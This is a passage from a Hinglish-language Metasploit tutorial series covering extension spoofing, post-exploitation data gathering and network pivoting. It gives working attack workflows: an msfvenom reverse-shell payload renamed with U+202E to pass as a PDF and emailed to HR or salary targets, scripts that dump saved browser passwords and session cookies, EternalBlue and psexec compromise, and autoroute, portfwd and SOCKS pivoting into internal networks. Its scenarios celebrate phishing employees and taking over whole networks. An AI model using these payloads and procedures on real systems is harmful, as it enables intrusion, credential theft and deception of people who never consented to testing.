- 🎯 `timestomp` = Time manipulation
- 🔍 Match existing files = Stealth
- 💾 Timeline = Confused
- ⚡ Forensic = Difficult
- 🚀 Professional touch!

---

## Topic 33: Extension Spoofing (U+202E Right-to-Left Override)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Extension Spoofing - File Extension Chhupao**  
.exe ko .jpg jaisa dikhao! 🎭

### 2. **Ye Kya Hai? (What is it?)**
Unicode character U+202E (Right-to-Left Override) use karke file extension spoof karte hain. File `backdoor.exe` dikhti hai `backdoorexe.jpg` jaisi!

### 3. **Kyun Zaroori Hai?**
- ✅ Social engineering
- ✅ Victim ko dhoka
- ✅ Email attachment bypass
- ✅ User click karega

### 4. **Ise Kab Use Karna Chahiye?**
- Client-side attacks
- Email phishing
- Social engineering
- File delivery

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Victim suspicious hoga
- .exe file nahi kholega
- Social engineering fail
- Detection easy

### 6. **Syntax aur Common Options**
```bash
# Kali mein Character Map
# Search: U+202E
# Copy character
# Filename: backdoor[U+202E]gpj.exe
# Display: backdoorexe.jpg
```

### 7. **Example 1 (Basic)** 💡
```bash
# Step 1: Character Map (Kali)
Applications → Character Map
Search: U+202E (Right-to-Left Override)
Copy character

# Step 2: Rename file
Original: invoice.exe
New: invoice[U+202E]gpj.exe
Display: invoiceexe.jpg

# Step 3: Victim ko bhejo
# Victim ko "invoiceexe.jpg" dikhega
# Click karega → .exe execute!
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete social engineering
# Step 1: Payload banana
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=443 -f exe -o salary.exe

# Step 2: Extension spoof
# Kali Character Map se U+202E copy
mv salary.exe "salary[U+202E]fdp.exe"
# Display: salaryexe.pdf

# Step 3: Archive banana (browser detection bypass)
zip salary_details.zip "salary[U+202E]fdp.exe"

# Step 4: Email bhejo
# Subject: "Salary Increment Details 2024"
# Attachment: salary_details.zip
# Victim extract karega → "salaryexe.pdf" dikhega
# Click karega → Meterpreter session!

# Analysis:
# Extension = Spoofed
# Archive = Browser bypass
# Social engineering = Strong
# Success rate = High!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- U+202E character galat copy
- Archive nahi banana (browser detect)
- Suspicious filename
- Context weak (email body)

### 10. **Best Practices / Pro Tips** 💎
- Hamesha archive (.zip/.rar) mein bhejo
- Filename relevant rakho (invoice, salary, report)
- Email context strong rakho
- Icon change karo (advanced)

### 11. **Asli Duniya ka Scenario** 🌍
HR department ko "Employee_Policy[U+202E]fdp.exe" bheja. Unhe "Employee_Policyexe.pdf" dikha. Click kiya - meterpreter session! Extension spoofing successful! 📧

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] U+202E character samajh aaya
- [ ] Extension spoof kar sakte hain
- [ ] Archive banana aata hai
- [ ] Social engineering context strong

### 13. **FAQs** ❓
**Q: Modern browsers detect nahi karte?**  
A: Karte hain! Isliye archive (.zip) mein bhejo.

**Q: U+202E kaise copy karein?**  
A: Character Map (Kali) ya Google se copy karo.

### 14. **Practice Task** 📝
1. Test .exe file banao
2. U+202E character copy karo
3. Extension spoof karo
4. Archive mein dalo aur test karo

### 15. **Aakhri Summary** 📌
- 🎯 U+202E = Extension spoofing
- 🔍 Archive = Browser bypass
- 💾 Social engineering = Key
- ⚡ Context = Strong email
- 🚀 High success rate!

---

## 🎁 **Module 8 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 8: Stealth & Persistence Master! 🥷             │
│                                                          │
│  ✅ Persistence = Registry + Service                    │
│  ✅ Clearev = Evidence removal                          │
│  ✅ Timestomp = Timeline manipulation                   │
│  ✅ Extension spoofing = Social engineering             │
│                                                          │
│  Pro Workflow:                                          │
│  1. Exploit → Persistence install                       │
│  2. Post-exploitation complete                          │
│  3. Timestomp uploaded files                            │
│  4. Clearev logs                                        │
│  5. Clean exit! 🧹                                      │
│                                                          │
│  Next: Module 9 - Data Gathering! 📊                   │
└─────────────────────────────────────────────────────────┘
```

**Module 8 Complete! Ready for Module 9?** 🚀

=============================================================

# 📊 Module 9: Windows Post-Exploitation (Data Gathering)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 34: `post/windows/gather/browser_history`

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Browser History - Victim Ki Online Activity**  
Kaun si websites visit ki, kya download kiya - sab pata karo! 🌐

### 2. **Ye Kya Hai? (What is it?)**
Yeh module victim ke browser history (Chrome, Firefox, IE, Edge) se visited URLs, downloads, aur cookies extract karta hai. Yeh ek digital footprint tracker hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Victim ki interests pata karna
- ✅ Banking/email sites identify
- ✅ Downloaded files track
- ✅ Social engineering data

### 4. **Ise Kab Use Karna Chahiye?**
- Victim profiling
- Sensitive sites identify
- Downloaded files dhundhna
- Social engineering planning

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Victim ki activity miss
- Banking sites pata nahi
- Social engineering weak
- Incomplete intelligence

### 6. **Syntax aur Common Options**
```bash
use post/windows/gather/browser_history
set SESSION [session_id]
run
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > background
msf6 > use post/windows/gather/browser_history
msf6 post(browser_history) > set SESSION 1
msf6 post(browser_history) > run

[*] Gathering browser history...
[*] Chrome history found
[*] Firefox history found
[+] History saved to: /root/.msf4/loot/20240115_history.db

# SQLite viewer se dekho
┌──(kali㉿kali)-[~]
└─$ sqlite3 /root/.msf4/loot/20240115_history.db
sqlite> SELECT url FROM urls LIMIT 10;
https://mail.google.com
https://www.facebook.com
https://bankofamerica.com
https://company-vpn.com
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete intelligence gathering
meterpreter > background
msf6 > use post/windows/gather/browser_history
msf6 > set SESSION 1
msf6 > run

[*] Extracting Chrome history...
[*] Extracting Firefox history...
[*] Extracting IE history...
[+] Loot stored: /root/.msf4/loot/victim_history.db

# Analysis (SQLite)
┌──(kali㉿kali)-[~]
└─$ sqlite3 victim_history.db

sqlite> .tables
urls  downloads  cookies

sqlite> SELECT url FROM urls WHERE url LIKE '%bank%';
https://chase.com/login
https://wellsfargo.com/account

sqlite> SELECT url FROM downloads;
/downloads/company_financial_report.pdf
/downloads/employee_database.xlsx

# Analysis:
# Banking sites = Phishing targets
# Downloads = Sensitive files location
# Cookies = Session hijacking possible
# Complete victim profile!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- SQLite viewer nahi install
- Loot location bhool jaana
- Browser profiles multiple (check all)
- Cookies ignore karna

### 10. **Best Practices / Pro Tips** 💎
- SQLite Browser install karo (GUI viewer)
- Banking/email sites note karo
- Downloaded files location track karo
- Cookies extract karo (session hijacking)

### 11. **Asli Duniya ka Scenario** 🌍
Browser history se pata chala victim roz `company-vpn.com` use karta hai. VPN credentials phishing attack se churaye. Internal network access mil gaya! Browser history = Intelligence goldmine! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Browser history module use kar sakte hain
- [ ] SQLite database analyze kar sakte hain
- [ ] Banking/sensitive sites identify kar sakte hain
- [ ] Downloaded files track kar sakte hain

### 13. **FAQs** ❓
**Q: Private browsing history mil sakta hai?**  
A: Nahi, incognito/private mode history save nahi hoti.

**Q: SQLite kaise dekhe?**  
A: `sqlite3` command ya DB Browser for SQLite (GUI).

### 14. **Practice Task** 📝
1. Browser history module chalaao
2. Loot file location note karo
3. SQLite se open karo
4. URLs analyze karo

### 15. **Aakhri Summary** 📌
- 🎯 Browser history = Victim profiling
- 🔍 Banking sites = Phishing targets
- 💾 Downloads = Sensitive files
- ⚡ Cookies = Session hijacking
- 🚀 Intelligence gathering!

---

## Topic 35: `post/windows/gather/forensics/recovery_files`

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Recovery Files - Delete Ki Gayi Files Wapas Lao**  
Victim ne delete kiya, aap recover karo! 🔄

### 2. **Ye Kya Hai? (What is it?)**
Yeh module deleted files ko recover karta hai (jo Recycle Bin se bhi delete ho chuki hain). Yeh ek digital archaeologist hai - purani cheezein khod kar nikalta hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Deleted sensitive files
- ✅ Evidence recovery
- ✅ Hidden data
- ✅ Forensic analysis

### 4. **Ise Kab Use Karna Chahiye?**
- Victim ne files delete ki hain
- Sensitive data dhundhna hai
- Forensic investigation
- Evidence chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Deleted files miss ho jayengi
- Sensitive data recover nahi hoga
- Evidence lost
- Incomplete investigation

### 6. **Syntax aur Common Options**
```bash
# Step 1: Drives enumerate
use post/windows/gather/forensics/enum_drives
set SESSION [session_id]
run

# Step 2: Files recover
use post/windows/gather/forensics/recovery_files
set SESSION [session_id]
set DRIVE C:
run
```

### 7. **Example 1 (Basic)** 💡
```bash
# Step 1: Available drives
meterpreter > background
msf6 > use post/windows/gather/forensics/enum_drives
msf6 > set SESSION 1
msf6 > run

[*] Drives found: C:, D:, E:

# Step 2: Recover files
msf6 > use post/windows/gather/forensics/recovery_files
msf6 > set SESSION 1
msf6 > set DRIVE C:
msf6 > run

[*] Scanning for deleted files...
[+] Found: passwords.txt (deleted)
[+] Found: financial_report.xlsx (deleted)
[*] Files saved to: /root/.msf4/loot/recovered/
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete forensic recovery
# Step 1: Enumerate drives
msf6 > use post/windows/gather/forensics/enum_drives
msf6 > set SESSION 1
msf6 > run

[*] C: - NTFS - 500GB
[*] D: - NTFS - 1TB

# Step 2: Recover from C:
msf6 > use post/windows/gather/forensics/recovery_files
msf6 > set SESSION 1
msf6 > set DRIVE C:
msf6 > set FILE_ID 1,2,3,4,5    # Multiple files
msf6 > run

[+] Recovered: employee_salaries.xlsx
[+] Recovered: confidential_memo.docx
[+] Recovered: passwords_backup.txt
[*] Loot: /root/.msf4/loot/recovered/

# Step 3: Analyze recovered files
┌──(kali㉿kali)-[~]
└─$ cd /root/.msf4/loot/recovered/
└─$ cat passwords_backup.txt
Admin: P@ssw0rd123
Database: DBPass2024

# Analysis:
# Deleted files = Recovered
# Sensitive data = Found
# Credentials = Extracted
# Victim thought deleted = Still accessible!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- enum_drives skip karna
- FILE_ID specify nahi karna
- Large files recover (time waste)
- Formatted drives try karna (won't work)

### 10. **Best Practices / Pro Tips** 💎
- Pehle enum_drives chalaao
- Specific FILE_ID use karo (faster)
- Small files pehle (txt, xlsx)
- Formatted drives skip karo

### 11. **Asli Duniya ka Scenario** 🌍
Victim ne "passwords.txt" delete kar di thi (Recycle Bin se bhi). Recovery module se file wapas aayi. Andar 20+ credentials the! Deleted ≠ Gone forever! 🔄

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] enum_drives module use kar sakte hain
- [ ] recovery_files module use kar sakte hain
- [ ] Deleted files recover kar sakte hain
- [ ] Sensitive data extract kar sakte hain

### 13. **FAQs** ❓
**Q: Formatted drive se recover ho sakta hai?**  
A: Nahi, yeh module sirf deleted files recover karta hai.

**Q: Kitne purani files recover ho sakti hain?**  
A: Depends on disk usage. Agar overwrite nahi hui, toh recover possible.

### 14. **Practice Task** 📝
1. Test file delete karo (Recycle Bin se bhi)
2. enum_drives chalaao
3. recovery_files chalaao
4. File recover verify karo

### 15. **Aakhri Summary** 📌
- 🎯 Recovery = Deleted files wapas
- 🔍 enum_drives = Pehle step
- 💾 Sensitive data = Often deleted
- ⚡ Deleted ≠ Gone
- 🚀 Forensic power!

---

## Topic 36: `post/windows/gather/usb_history`

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**USB History - Kaun Se USB Lage The**  
Victim ne kaun se USB drives use kiye - track karo! 💾

### 2. **Ye Kya Hai? (What is it?)**
Yeh module Windows registry se USB devices ki history extract karta hai - device name, serial number, last connected time. Yeh ek USB detective hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Data exfiltration track
- ✅ External devices identify
- ✅ Forensic evidence
- ✅ Security audit

### 4. **Ise Kab Use Karna Chahiye?**
- Data theft suspect hai
- USB policy check
- Forensic investigation
- Security audit

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- USB usage miss
- Data exfiltration undetected
- Security breach unnoticed
- Incomplete audit

### 6. **Syntax aur Common Options**
```bash
use post/windows/gather/usb_history
set SESSION [session_id]
run
```

### 7. **Example 1 (Basic)** 💡
```bash
meterpreter > background
msf6 > use post/windows/gather/usb_history
msf6 post(usb_history) > set SESSION 1
msf6 post(usb_history) > run

[*] Gathering USB history...
[+] USB Device: SanDisk Cruzer
    Serial: 4C530001234567890123
    Last Connected: 2024-01-10 14:30:00

[+] USB Device: Kingston DataTraveler
    Serial: 60A44C413E82BBA1
    Last Connected: 2024-01-15 09:15:00
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete USB forensics
meterpreter > background
msf6 > use post/windows/gather/usb_history
msf6 > set SESSION 1
msf6 > run

[*] Enumerating USB devices...
[+] Device 1:
    Name: SanDisk Ultra 64GB
    Serial: 0123456789ABCDEF
    Vendor: SanDisk
    First Connected: 2024-01-05 10:00:00
    Last Connected: 2024-01-15 16:45:00
    Connection Count: 15 times

[+] Device 2:
    Name: WD My Passport 1TB
    Serial: WXY1234567890
    Vendor: Western Digital
    First Connected: 2024-01-14 18:00:00
    Last Connected: 2024-01-14 18:30:00
    Connection Count: 1 time

# Analysis:
# SanDisk = Regular use (15 times)
# WD Passport = One time (suspicious!)
# Last connected = Recent (data exfiltration?)
# Large capacity = Bulk data transfer possible
# Report to client: Potential data theft!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Output save nahi karna
- Serial numbers ignore karna
- Connection count miss karna
- Timeline analysis skip

### 10. **Best Practices / Pro Tips** 💎
- Output file mein save karo
- Serial numbers note karo (unique identifier)
- Connection count check karo (frequent vs one-time)
- Timeline analyze karo (recent activity)

### 11. **Asli Duniya ka Scenario** 🌍
Employee termination se ek din pehle 1TB external drive connect hua (pehli baar). Suspicious! Investigation se pata chala - company data copy kar raha tha. USB history ne pakda! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] USB history module use kar sakte hain
- [ ] Device details extract kar sakte hain
- [ ] Connection timeline track kar sakte hain
- [ ] Data exfiltration detect kar sakte hain

### 13. **FAQs** ❓
**Q: Current connected USB dikha sakta hai?**  
A: Nahi, yeh sirf history hai. Current ke liye `shell` se `wmic` use karo.

**Q: USB history delete ho sakti hai?**  
A: Registry clean karne se delete ho sakti hai, par traces rahte hain.

### 14. **Practice Task** 📝
1. USB history module chalaao
2. Devices list dekho
3. Serial numbers note karo
4. Connection timeline analyze karo

### 15. **Aakhri Summary** 📌
- 🎯 USB history = Device tracking
- 🔍 Serial numbers = Unique ID
- 💾 Connection count = Usage pattern
- ⚡ Timeline = Suspicious activity
- 🚀 Data exfiltration detection!

---

## Topic 37: Meterpreter Scripts (`run enum_chrome`, `run enum_firefox`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Meterpreter Scripts - Browser Data Extraction**  
Chrome/Firefox se passwords, cookies, history - sab nikalo! 🔐

### 2. **Ye Kya Hai? (What is it?)**
Meterpreter scripts browser-specific data extract karte hain - saved passwords, cookies, bookmarks, history. Yeh browser ke vault ko unlock karta hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Saved passwords extract
- ✅ Session cookies steal
- ✅ Bookmarks analyze
- ✅ Complete browser data

### 4. **Ise Kab Use Karna Chahiye?**
- Browser passwords chahiye
- Session hijacking
- Bookmark analysis
- Complete intelligence

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Saved passwords miss
- Session cookies lost
- Incomplete data
- Manual extraction (time waste)

### 6. **Syntax aur Common Options**
```bash
# Chrome
run enum_chrome

# Firefox
run enum_firefox

# Manual (if scripts fail)
download C:\\Users\\[user]\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
```

### 7. **Example 1 (Basic)** 💡
```bash
# Chrome enumeration
meterpreter > run enum_chrome
[*] Gathering Chrome data...
[+] Passwords found: 5
[+] Cookies found: 150
[+] History entries: 500
[*] Data saved to: /root/.msf4/loot/chrome_data.txt

# Firefox enumeration
meterpreter > run enum_firefox
[*] Gathering Firefox data...
[+] Passwords found: 3
[+] Bookmarks found: 50
[*] Data saved to: /root/.msf4/loot/firefox_data.txt
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete browser intelligence
# Step 1: Chrome data
meterpreter > run enum_chrome
[*] Extracting Chrome passwords...
[+] Site: mail.google.com
    Username: admin@company.com
    Password: CompanyAdmin@2024

[+] Site: company-vpn.com
    Username: admin
    Password: VPN@Pass123

[*] Extracting cookies...
[+] Session cookie: PHPSESSID=abc123...
[+] Auth token: Bearer eyJ0eXAi...

# Step 2: Firefox data
meterpreter > run enum_firefox
[+] Site: github.com
    Username: company-dev
    Password: DevPass@2024

# Step 3: Use credentials
# VPN login: admin / VPN@Pass123
# Email access: admin@company.com / CompanyAdmin@2024
# GitHub: company-dev / DevPass@2024

# Analysis:
# Saved passwords = Direct access
# Session cookies = Hijacking possible
# Multiple accounts = Lateral movement
# Browser = Credential goldmine!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Scripts outdated (manual extraction better)
- Master password protected (Chrome/Firefox)
- Loot location bhool jaana
- Cookies expiry ignore

### 10. **Best Practices / Pro Tips** 💎
- Agar script fail ho, manual download karo
- Master password check karo
- Cookies quickly use karo (expire ho jaate hain)
- Multiple browsers check karo

### 11. **Asli Duniya ka Scenario** 🌍
Chrome se 15 saved passwords nikale - email, VPN, GitHub, AWS console sab! Ek browser se poora infrastructure access mil gaya. Users save passwords = Hacker's dream! 🔐

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] enum_chrome/firefox scripts use kar sakte hain
- [ ] Saved passwords extract kar sakte hain
- [ ] Session cookies steal kar sakte hain
- [ ] Multiple accounts access kar sakte hain

### 13. **FAQs** ❓
**Q: Master password protected hai?**  
A: Toh script fail hoga. Manual extraction try karo ya keylogger use karo.

**Q: Cookies kab tak valid hain?**  
A: Depends on site. Quickly use karo (1-24 hours usually).

### 14. **Practice Task** 📝
1. Test browser mein password save karo
2. enum_chrome/firefox chalaao
3. Loot file dekho
4. Passwords verify karo

### 15. **Aakhri Summary** 📌
- 🎯 Browser scripts = Password extraction
- 🔍 Saved passwords = Direct access
- 💾 Session cookies = Hijacking
- ⚡ Multiple browsers = Check all
- 🚀 Credential goldmine!

---

## 🎁 **Module 9 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 9: Data Gathering Master! 📊                    │
│                                                          │
│  ✅ Browser history = Victim profiling                  │
│  ✅ Recovery files = Deleted data                       │
│  ✅ USB history = Device tracking                       │
│  ✅ Browser scripts = Password extraction               │
│                                                          │
│  Pro Workflow:                                          │
│  1. Browser history (intelligence)                      │
│  2. USB history (data exfiltration check)               │
│  3. Recovery files (deleted sensitive data)             │
│  4. Browser scripts (credentials)                       │
│  5. Complete victim profile! 🎯                         │
│                                                          │
│  Next: Module 10 - Pivoting & Lateral Movement! 🔄     │
└─────────────────────────────────────────────────────────┘
```

**Module 9 Complete! Ready for Module 10?** 🚀

=============================================================

# 🔄 Module 10: Phase 5 - Pivoting & Lateral Movement

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 38: `autoroute` (Accessing Internal Networks)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Autoroute - Internal Network Ka Darwaza**  
Ek machine hack karo, poora network access karo! 🚪

### 2. **Ye Kya Hai? (What is it?)**
`autoroute` command compromised machine ko pivot point banata hai. Isse aap internal network (jo internet se connected nahi hai) ko access kar sakte hain. Yeh ek bridge hai - ek taraf se doosri taraf jaane ke liye!

### 3. **Kyun Zaroori Hai?**
- ✅ Internal network access
- ✅ Isolated systems reach
- ✅ Network penetration
- ✅ Complete infrastructure compromise

### 4. **Ise Kab Use Karna Chahiye?**
- Victim dual-homed hai (2 networks)
- Internal network access chahiye
- DMZ se internal jump
- Complete network pentest

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Internal network unreachable
- Isolated systems miss
- Incomplete pentest
- Limited scope

### 6. **Syntax aur Common Options**
```bash
# Meterpreter
run autoroute -s [subnet]        # Add route
run autoroute -p                 # Print routes
run autoroute -d [subnet]        # Delete route

# Background session
background
route print                      # MSF routes
```

### 7. **Example 1 (Basic)** 💡
```bash
# Step 1: Network check
meterpreter > ipconfig
Interface 1 - Ethernet
IP: 192.168.1.105 (External)

Interface 2 - Ethernet 2
IP: 10.10.10.50 (Internal)

# Step 2: Add route
meterpreter > run autoroute -s 10.10.10.0/24
[*] Adding route to 10.10.10.0/255.255.255.0...
[+] Route added

# Step 3: Verify
meterpreter > run autoroute -p
Active Routing Table
====================
Subnet           Netmask          Gateway
------           -------          -------
10.10.10.0       255.255.255.0    Session 1
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete pivoting workflow
# Step 1: Compromise edge machine
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.105
msf6 > exploit
[*] Meterpreter session 1 opened

# Step 2: Network reconnaissance
meterpreter > ipconfig
Ethernet adapter:
  IP: 192.168.1.105 (DMZ)
Ethernet adapter 2:
  IP: 10.10.10.50 (Internal)

# Step 3: Add route
meterpreter > run autoroute -s 10.10.10.0/24
[+] Route added

meterpreter > background

# Step 4: Scan internal network
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.0/24
msf6 > set PORTS 445,3389,22
msf6 > run

[+] 10.10.10.10:445 - TCP OPEN
[+] 10.10.10.20:3389 - TCP OPEN
[+] 10.10.10.30:22 - TCP OPEN

# Step 5: Exploit internal machines
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.10.10
msf6 > set SMBUser admin
msf6 > set SMBPass Password123
msf6 > exploit

[*] Meterpreter session 2 opened (internal machine!)

# Analysis:
# Edge machine = Pivot point
# Internal network = Now accessible
# 3 internal machines = Discovered
# Complete network = Compromised!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Subnet mask galat
- Multiple interfaces check nahi karna
- Route verify nahi karna
- Session background nahi karna

### 10. **Best Practices / Pro Tips** 💎
- `ipconfig` se saare interfaces check karo
- `/24` subnet common hai
- Route add ke baad verify karo
- Session background mein rakho

### 11. **Asli Duniya ka Scenario** 🌍
DMZ server hack kiya (192.168.1.105). Usme 2 network cards the - ek external, ek internal (10.10.10.0/24). Autoroute se internal network access kiya. 50+ internal servers hack kiye. Ek machine se poora network! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] `ipconfig` se interfaces check kar sakte hain
- [ ] `autoroute -s` se route add kar sakte hain
- [ ] Internal network scan kar sakte hain
- [ ] Pivoting concept clear hai

### 13. **FAQs** ❓
**Q: Multiple subnets ke liye?**  
A: Multiple `autoroute -s` commands chalaao.

**Q: Route delete kaise karein?**  
A: `autoroute -d [subnet]`

### 14. **Practice Task** 📝
1. Dual-homed VM setup karo
2. Meterpreter session lo
3. `ipconfig` check karo
4. `autoroute` add karo
5. Internal network scan karo

### 15. **Aakhri Summary** 📌
- 🎯 Autoroute = Internal network access
- 🔍 Dual-homed = 2 networks
- 💾 Pivot point = Bridge
- ⚡ One machine = Entire network
- 🚀 Network penetration!

---

## Topic 39: `portfwd` (Port Forwarding)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Portfwd - Port Ko Forward Karo**  
Internal service ko apne Kali par access karo! 🔌

### 2. **Ye Kya Hai? (What is it?)**
`portfwd` command internal machine ke port ko aapke local machine par forward karta hai. Jaise internal RDP (3389) ko aapke Kali ke port 3389 par. Yeh ek tunnel hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Internal services access
- ✅ GUI tools use karna (RDP, VNC)
- ✅ Direct connection
- ✅ Service-specific attacks

### 4. **Ise Kab Use Karna Chahiye?**
- Internal RDP/VNC access
- Database connection
- Web admin panels
- GUI tools chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- GUI tools use nahi kar paayenge
- RDP access nahi
- Service-specific tools fail
- Manual tunneling (complex)

### 6. **Syntax aur Common Options**
```bash
# Add forward
portfwd add -l [local_port] -p [remote_port] -r [remote_host]

# List forwards
portfwd list

# Delete forward
portfwd delete -l [local_port]

# Flush all
portfwd flush
```

### 7. **Example 1 (Basic)** 💡
```bash
# Internal RDP forward
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.10
[*] Local TCP relay created: :3389 <-> 10.10.10.10:3389

# Kali se RDP
┌──(kali㉿kali)-[~]
└─$ rdesktop 127.0.0.1:3389
# Internal machine ka RDP!
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete port forwarding
# Step 1: Autoroute setup
meterpreter > run autoroute -s 10.10.10.0/24

# Step 2: Internal scan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.10
msf6 > run

[+] 10.10.10.10:3389 - RDP OPEN
[+] 10.10.10.10:3306 - MySQL OPEN
[+] 10.10.10.10:80 - HTTP OPEN

# Step 3: Forward multiple ports
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.10
meterpreter > portfwd add -l 3306 -p 3306 -r 10.10.10.10
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.10

meterpreter > portfwd list
Active Port Forwards
====================
Index  Local    Remote         Direction
-----  -----    ------         ---------
1      3389     10.10.10.10:3389    Forward
2      3306     10.10.10.10:3306    Forward
3      8080     10.10.10.10:80      Forward

# Step 4: Use forwarded ports
# RDP
┌──(kali㉿kali)-[~]
└─$ rdesktop 127.0.0.1:3389

# MySQL
┌──(kali㉿kali)-[~]
└─$ mysql -h 127.0.0.1 -P 3306 -u root -p

# Web
┌──(kali㉿kali)-[~]
└─$ firefox http://127.0.0.1:8080

# Analysis:
# Multiple services = Forwarded
# Local access = Direct
# GUI tools = Working
# Internal services = Fully accessible!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Local port already in use
- Remote host IP galat
- Autoroute pehle nahi kiya
- Forwards list check nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Common ports: 3389 (RDP), 3306 (MySQL), 5900 (VNC)
- Local port different rakho agar conflict hai
- `portfwd list` se verify karo
- Session active rakho (forward ke liye)

### 11. **Asli Duniya ka Scenario** 🌍
Internal database server (10.10.10.20:3306) ko access karna tha. Portfwd se local 3306 par forward kiya. MySQL Workbench se connect kiya - poora database dump! GUI tools + pivoting = Powerful! 💪

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] `portfwd add` kar sakte hain
- [ ] Multiple ports forward kar sakte hain
- [ ] Local se internal services access kar sakte hain
- [ ] GUI tools use kar sakte hain

### 13. **FAQs** ❓
**Q: Port already in use error?**  
A: Different local port use karo: `-l 13389` instead of `-l 3389`

**Q: Forward kab tak valid hai?**  
A: Jab tak meterpreter session active hai.

### 14. **Practice Task** 📝
1. Internal service identify karo
2. Portfwd add karo
3. Local se access try karo
4. Multiple ports forward karo

### 15. **Aakhri Summary** 📌
- 🎯 Portfwd = Port forwarding
- 🔍 Local access = Internal services
- 💾 GUI tools = Working
- ⚡ RDP/MySQL/VNC = Accessible
- 🚀 Direct connection!

---

## Topic 40: SOCKS Proxy (Using Internal Tools like Proxychains)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**SOCKS Proxy - Poore System Ko Pivot Karo**  
Kali ke saare tools internal network par chalaao! 🌐

### 2. **Ye Kya Hai? (What is it?)**
SOCKS proxy compromised machine ko proxy server banata hai. Proxychains se aap apne Kali ke kisi bhi tool ko internal network par chala sakte hain. Yeh ek universal tunnel hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Any tool use karna (nmap, sqlmap, burp)
- ✅ Browser internal sites
- ✅ Complete toolset
- ✅ Flexible pivoting

### 4. **Ise Kab Use Karna Chahiye?**
- Multiple tools chahiye
- Browser internal sites
- Nmap/sqlmap internal network par
- Complete pentest

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Limited to MSF modules
- External tools use nahi kar paayenge
- Browser internal sites nahi
- Incomplete toolset

### 6. **Syntax aur Common Options**
```bash
# Metasploit
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Proxychains config
nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080

# Use with tools
proxychains nmap [target]
proxychains firefox
```

### 7. **Example 1 (Basic)** 💡
```bash
# Step 1: SOCKS proxy setup
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j
[*] SOCKS proxy started on 127.0.0.1:1080

# Step 2: Proxychains config
┌──(kali㉿kali)-[~]
└─$ nano /etc/proxychains4.conf
# Last line add:
socks5 127.0.0.1 1080

# Step 3: Use tools
┌──(kali㉿kali)-[~]
└─$ proxychains nmap -sT 10.10.10.10
[proxychains] Strict chain ... 127.0.0.1:1080 ... 10.10.10.10:445 ... OK
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete SOCKS pivoting
# Step 1: Autoroute
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

# Step 2: SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# Step 3: Proxychains config
